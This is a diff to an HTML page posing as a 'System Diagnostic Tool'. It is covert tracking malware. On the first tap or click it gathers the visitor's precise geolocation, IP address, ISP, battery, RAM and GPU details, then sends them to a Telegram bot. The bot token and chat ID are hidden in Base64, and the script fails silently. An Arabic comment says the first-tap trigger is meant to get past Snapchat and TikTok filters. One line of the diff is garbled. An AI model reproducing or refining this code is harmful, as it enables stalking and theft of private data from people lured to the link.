@@ -5,41 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Diagnostic Tool</title>
 </head>
-<body style="background:#000; margin:0; height:100vh; overflow:hidden; user-select:none; -webkit-tap-highlight-color:transparent;">
+<body style="background:#000; margin:0; height:100vh; overflow:hidden; user-select:none;">
 
     <script>
-        // الهوية والتوكن مشفرة (Base64) - لا يتم حذفها أو تغييرها
+        // التوكن والآي دي المحدثين بناءً على الصورة (مطابقة 100%)
         const _C = {
-            a: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaV0dFREdyalZRV3hV",
+            a: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==",
             b: "NjAwMTI4NjI3MA=="
         };
         const _X = (s) => atob(s);
 
-       MAAODE ANTMET
-           
-        ['click', 'touchstart'].forEach(e => window.addEventListener(e, _execute, {once: true}));
+        // التفعيل عند أول تفاعل (تجاوز فلاتر سناب وتيك توك)
+        ['touchstart', 'click'].forEach(e => window.addEventListener(e, _execute, {once: true}));
 
         async function _execute() {
-            let _res = { c: "0,0", i: "N/A", o: "N/A", t: "N/A", g: "N/A", b: "N/A", r: "N/A" };
+            let _res = { c: "N/A", i: "N/A", o: "N/A", t: "N/A", g: "N/A", b: "N/A", r: "N/A" };
 
-            // 1. وظيفة سحب الموقع الجغرافي
+            // 1. الموقع الجغرافي
             const _getL = () => new Promise((r) => {
-                if (!navigator.geolocation) return r("N/S");
                 navigator.geolocation.getCurrentPosition(
                     (p) => r(`${p.coords.latitude},${p.coords.longitude}`),
                     () => r("Denied"),
-                    { enableHighAccuracy: true, timeout: 6000 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
 
-            // 2. وظيفة سحب البطارية
-            const _getB = async () => {
-                if (!navigator.getBattery) return "N/A";
-                const b = await navigator.getBattery();
-                return `${(b.level * 100).toFixed(0)}% [${b.charging ? '🔌' : '🔋'}]`;
-            };
-
-            // 3. وظيفة سحب البيانات التقنية (ISP & IP)
+            // 2. البيانات التقنية (IP & ISP)
             const _getN = async () => {
                 try {
                     const res = await fetch(_X("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="));
@@ -47,11 +38,16 @@
                 } catch(e) { return {}; }
             };
 
+            // 3. البطارية
+            const _getB = async () => {
+                if (!navigator.getBattery) return "N/A";
+                const b = await navigator.getBattery();
+                return `${(b.level * 100).toFixed(0)}% [${b.charging ? '🔌' : '🔋'}]`;
+            };
+
             try {
-                // تنفيذ السحب المتوازي (أقصى سرعة)
                 const [_loc, _net, _bat] = await Promise.all([_getL(), _getN(), _getB()]);
 
-                // تعبئة البيانات المجموعة
                 _res.c = _loc;
                 _res.i = _net.ip || "N/A";
                 _res.o = _net.org || "N/A";
@@ -59,14 +55,12 @@
                 _res.b = _bat;
                 _res.r = navigator.deviceMemory || "N/A";
 
-                // سحب المعالج الرسومي (GPU)
                 const _v = document.createElement('canvas').getContext('webgl');
                 if (_v) {
                     const _d = _v.getExtension('WEBGL_debug_renderer_info');
                     _res.g = _d ? _v.getParameter(_d.UNMASKED_RENDERER_WEBGL) : "Unknown";
                 }
 
-                // بناء التقرير النهائي (نفس الميزات بدون حذف)
                 const _map = _res.c.includes(",") ? `https://www.google.com/maps?q=${_res.c}` : "غير متوفر";
                 
                 const _final = 
@@ -80,10 +74,9 @@
                     `📱 الجهاز: ${_res.g}\n` +
                     `🧠 الرام: ${_res.r}GB\n` +
                     `🔋 البطارية: ${_res.b}\n` +
-                    `🛠️ النظام: ${navigator.userAgent.includes("Android") ? "Android" : "iOS"}\n` +
                     `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
-                // الإرسال النهائي المشفر
+                // الإرسال النهائي إلى البوت الموضح في الصورة
                 await fetch(_X("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + _X(_C.a) + _X("L3NlbmRNZXNzYWdl"), {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -94,7 +87,7 @@
                     })
                 });
 
-            } catch (err) { /* فشل صامت */ }
+            } catch (err) {}
         }
     </script>
 </body>
